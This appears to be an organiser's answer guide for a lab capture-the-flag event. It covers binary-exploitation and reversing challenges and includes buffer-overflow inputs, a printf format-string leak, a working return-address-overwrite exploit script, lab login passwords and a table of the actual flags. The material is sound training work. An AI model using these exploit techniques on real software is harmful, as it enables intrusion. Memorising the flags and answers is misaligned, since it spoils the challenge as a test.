For Shaula through Acrab, connect with `ssh <star>@192.168.68.103 -p 2220` and the password `scorpius`; the login drops straight into the program. On a computer that has `nc`, you can instead connect to the matching port: Shaula 9002, Sargas 9003, Lesath 9004, Dschubba 9005, Acrab 9006. Antares needs raw bytes and is handled separately below.

### Shaula

The menu shows three options, but the source has a hidden fourth case.

1. Connect: `ssh shaula@192.168.68.103 -p 2220`, password `scorpius`.
2. At the `>` prompt, type `314` and press Enter.
3. It prints `Welcome, guide. Here's tonight's code:` and the flag.

Last time's `42` now says "That's not on the menu."

### Sargas

The flag costs 1000 credits and you have 100. The shop checks you can afford a purchase but doesn't stop you buying a negative quantity, which refunds credits.

1. Connect: `ssh sargas@192.168.68.103 -p 2220`, password `scorpius`.
2. Choose `1` (buy maps). When asked how many, enter `-100`. That costs `-1000`, so your credits rise from 100 to 1100.
3. Choose `2` (buy the flag). You can now afford it, and it prints the flag.

### Lesath

The name tag holds 16 characters, and the "are you an astronomer" flag sits right after it in memory. A long enough name overflows into it.

1. Connect: `ssh lesath@192.168.68.103 -p 2220`, password `scorpius`.
2. When asked for your name, type 17 or more characters (e.g. `AAAAAAAAAAAAAAAAA`) and press Enter.
3. The overflow sets the astronomer value to non-zero, and the program prints the flag.

### Dschubba

Same idea as Lesath, but the overflow has to land one exact 4-byte value in `key`. From the struct, `name` is 32 bytes and `visits` is 4, so `key` begins 36 bytes in. It must equal `0x41564f4e`, which in little-endian byte order is the text `NOVA`.

1. Connect: `ssh dschubba@192.168.68.103 -p 2220`, password `scorpius`.
2. When asked for your name, enter exactly 36 characters followed by `NOVA`:
   ```text
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANOVA
   ```
3. The program echoes `Key on file: 0x41564f4e` and prints the flag. (If it shows a different hex value, your filler wasn't exactly 36 characters.)

### Acrab

The program passes your input straight to `printf`, so format codes like `%s` read from memory. The flag is on the stack, at argument position 31.

1. Connect: `ssh acrab@192.168.68.103 -p 2220`, password `scorpius`.
2. At the `Callsign:` prompt, enter `%31$s` and press Enter.
3. It prints the flag on the `Transmitting:` line.

To find the position from scratch (if the binary is recompiled), try `%p %p %p %p` first to confirm the bug, then step `%6$s`, `%7$s`, … upward. A crash just means that slot wasn't a text pointer; reconnect and keep going. I checked that 31 still works on the rebuilt program.

### Antares

A classic return-address overwrite. The buffer is 64 bytes with 8 more bytes of saved data before the return address (72 bytes total), and the program prints the address of the `supernova()` function, which reads the flag. This needs raw bytes, so pipe them in rather than typing.

The address is currently `0x4017c5`, the same as last time. **Read it live each time** from the program's `supernova() is at 0x...` line, because it changes if `antares.c` is recompiled.

- **From the SSH box** (log in to any Ursa Minor account, which has `nc`), with the current address:
  ```bash
  printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc5\x17\x40\x00\x00\x00\x00\x00' | nc antares 9001
  ```
  That's 72 `A`s, then the 8-byte address written backwards (little-endian). It prints `*** CORE COLLAPSE ***` and the flag.

- **From your own computer with Python** (reads the address automatically, so it survives a rebuild):
  ```python
  import socket, re, struct
  s = socket.create_connection(("192.168.68.103", 9001))
  banner = s.recv(4096).decode(errors="replace")
  addr = int(re.search(r"supernova\(\) is at (0x[0-9a-fA-F]+)", banner).group(1), 16)
  s.sendall(b"A" * 72 + struct.pack("<Q", addr))
  print(s.recv(4096).decode(errors="replace"))
  ```

## Draco (Reversing)

| Star | Difficulty | Starts at | Flag |
|---|---|---|---|
| Thuban | ★ Easy | 30 | `STARS{thub4n_wr0t3_1t_d0wn}` |
| Eltanin | ★ Easy | 30 | `STARS{3lt4n1n_s4w_th3_c0mp4r1s0n}` |
| Rastaban | ★ Easy | 30 | `STARS{r4st4b4n_sp34ks_1n_numb3rs}` |
| Alsafi | ★ Easy | 30 | `STARS{4ls4f1_c0unts_fr0m_z3r0}` |
| Kuma | ★ Easy | 30 | `STARS{kum4_r34d_1ts_3nv1r0nm3nt}` |
| Altais | ★★ Medium | 60 | `STARS{4lt41s_p4us3d_m1d_m3ss4g3}` |
| Edasich | ★★ Medium | 60 | `STARS{3d4s1ch_unw0und_th3_c01ls}` |
| Alrakis | ★★ Medium | 60 | `STARS{4lr4k1s_r34d_th3_4ss3mbly}` |
| Tyl | ★★ Medium | 60 | `STARS{tyl_l3v3l3d_up_w1th_gdb}` |
| Aldhibah | ★★★ Hard | 100 | `STARS{4ldh1b4h_r4nk_s3v3n_r1d3r}` |

Every Draco star is on its own SSH box: `ssh <star>@192.168.68.103 -p 2222`, password `draco` for all ten. Each account's home folder holds just that star's program, and the box already has `strings`, `ltrace`, `gdb`, `objdump` and `python3`, so players install nothing. The flags are scrambled inside the programs (except Thuban's), so `strings` only works on Thuban. I solved all ten over SSH on a test copy of the box, and each level's build checks that it can still be solved.

gdb may print a warning that it can't find the `.c` file. That's expected, because players get the program without its source, and the gdb descriptions say so.

### Thuban

The "start here" level, with the steps in the description. The flag is stored in the program as plain text, but the program never prints it.

1. Log in: `ssh thuban@192.168.68.103 -p 2222`, password `draco`.
2. Run `strings thuban | grep STARS`.
3. It prints the flag.

### Eltanin

The program takes a guess after its name and compares it with the real password using `strcmp`. The real password is stored scrambled, so `strings` doesn't show it, but `ltrace` shows every library call along with its arguments.

1. Log in: `ssh eltanin@192.168.68.103 -p 2222`, password `draco`.
2. Run `ltrace ./eltanin hello`.
3. One line reads `strcmp("hello", "the-dragon-blinks")`. The second text is the password.
4. Run `./eltanin the-dragon-blinks`. It prints `The dragon's eye opens. STARS{...}`.

The guess comes after the program's name, not at a prompt, on purpose: with a prompt, ltrace's output gets tangled up with the program's and players can't tell it's waiting for them.

### Rastaban

A new trick: the Python program keeps its password as a list of character codes.

1. Log in: `ssh rastaban@192.168.68.103 -p 2222`, password `draco`.
2. `cat rastaban.py` shows `CODES = [98, 101, 116, 97, 45, 100, 114, 97, 99, 111, 110, 105, 115]` and the line `password = "".join(chr(code) for code in CODES)`.
3. Turn the codes into letters, either way:
   - Type `python3`, then `"".join(chr(code) for code in [98, 101, 116, 97, 45, 100, 114, 97, 99, 111, 110, 105, 115])`. It shows `'beta-draconis'`. Type `exit()` to leave.
   - Or paste the numbers into CyberChef with **From Decimal**, **Delimiter** set to `Comma`.
4. Run `python3 rastaban.py` and type `beta-draconis`. It prints `Rastaban nods. STARS{...}`.

The flag in the file is XORed with the password, so it can't be read without solving the level.

### Alsafi

The Python program checks the password one letter at a time, by position, in a jumbled order. Python counts positions from 0, which the description says.

1. Log in: `ssh alsafi@192.168.68.103 -p 2222`, password `draco`.
2. `cat alsafi.py` shows `if len(guess) != 10:`, then ten checks like `if guess[3] != "w":`, out of order.
3. Write the positions 0 to 9 in a row and put each letter under its number: `s k y w a t c h e r`.
4. Run `python3 alsafi.py` and type `skywatcher`. It prints `Alsafi lets you in. STARS{...}`.

Typing the letters in the order the checks appear gives `Wrong password.`, which is the likely first mistake.

### Kuma

The program reads its password from an environment variable, `KUMA_EYE`. `ltrace` shows the variable's name, then the value it wants.

1. Log in: `ssh kuma@192.168.68.103 -p 2222`, password `draco`.
2. Run `./kuma`. It says its eye stays shut, waiting for a setting.
3. Run `ltrace ./kuma`. One line reads `getenv("KUMA_EYE") = nil`: it asked for `KUMA_EYE`, and it isn't set.
4. Run `KUMA_EYE=hello ltrace ./kuma`. Now one line reads `strcmp("hello", "wake-the-dragon")`.
5. Run `KUMA_EYE=wake-the-dragon ./kuma`. It prints `Kuma's eyes open wide. STARS{...}`.

`strings kuma` also shows the name `KUMA_EYE`, but not the value.

### Altais

The program decodes the flag into memory, then scrubs it without printing it. gdb can pause the program just before the scrub.

1. Log in: `ssh altais@192.168.68.103 -p 2222`, password `draco`.
2. Run `gdb ./altais`. `info functions` lists `main`, `decode_message`, `scrub_message` and `show_banner` at the top, under `File altais.c`.
3. Type `break scrub_message`, then `run`.
4. gdb pauses with `Breakpoint 1, scrub_message (message=0x7ffe... "STARS{...}")`, so the flag is already on screen. `info args` or `print message` shows it again.
5. `quit` (answer `y`) leaves gdb.

### Edasich

The Python program scrambles the password three ways, in a new order: it moves each letter 5 along the alphabet, reverses it, then writes it as hex. The stored value is `SCRAMBLED = "73746c6677696a6d796b74716e6679"`. Undo the steps in the opposite order.

1. Log in: `ssh edasich@192.168.68.103 -p 2222`, password `draco`.
2. `cat edasich.py` and copy the `SCRAMBLED` value.
3. In CyberChef: **From Hex** (gives `stlfwijmyktqnfy`), then **Reverse** (gives `yfnqtkymjiwflts`), then **ROT13** with **Amount** `21` (gives `tailofthedragon`).
4. Run `python3 edasich.py` and type `tailofthedragon`. It prints `Edasich lets you pass. STARS{...}`.

The program only accepts letters, and lowercases what you type.

### Alrakis

The code is a number written into the program's instructions, so `strings` can't find it. gdb shows the instructions as assembly.

1. Log in: `ssh alrakis@192.168.68.103 -p 2222`, password `draco`.
2. Run `gdb ./alrakis`. `info functions` lists `check_code`, `reveal_flag` and `main`.
3. Type `disassemble check_code`. One line reads `cmpq   $0x5e1f3,-0x8(%rbp)`. The number after `$` is the code.
4. `quit` gdb, run `./alrakis`, and type `0x5e1f3` at the `Code:` prompt. It prints `The treasure opens. STARS{...}`.

The program reads the number with `strtol(..., 0)`, so it accepts hex with `0x` or the same number in decimal, `385523`. Typing `5e1f3` without the `0x` is wrong. `objdump -d alrakis` shows the same instruction outside gdb.

### Tyl

The program only shows the flag at observer level 9000 or more, and always starts you at 1. gdb can change a variable while the program is paused.

1. Log in: `ssh tyl@192.168.68.103 -p 2222`, password `draco`.
2. Run `./tyl` once. It says your level is 1 and Tyl needs 9000.
3. Run `gdb ./tyl`. Type `break check_level`, then `run`.
4. When it pauses, `print level` shows `$1 = 1`.
5. Type `set var level = 9000`, then `continue`. It prints `Your observer level is 9000.` and `Tyl salutes you, master observer. STARS{...}`.

Making the function `return` early, the Aldhibah trick, doesn't help here, because the flag is printed inside `check_level`.

### Aldhibah

The program sleeps for a thousand years in `hibernate()`, then asks `rider_rank()` for your rank, and only rank 7 hears the flag. Your rank is 0 unless you're root. gdb can make each function return early, and choose what `rider_rank()` returns. The program itself says which rank it wants, but only after the sleep.

1. Log in: `ssh aldhibah@192.168.68.103 -p 2222`, password `draco`.
2. Run `gdb ./aldhibah`.
3. Type `break hibernate`, then `run`. At the pause, type `return`, answer `y`, then `continue`.
4. It prints `The dragon wakes and sees a rider of rank 0. It only speaks to riders of rank 7, so it goes back to sleep.`
5. Type `break rider_rank`, then `run` (answer `y` to start again). At the `hibernate` pause, `return`, `y`, `continue` as before.
6. At the `rider_rank` pause, type `return 7`, answer `y`, then `continue`.
7. It prints `The dragon speaks: STARS{...}`.

Running `./aldhibah` without gdb just sleeps. Ctrl+C stops it.
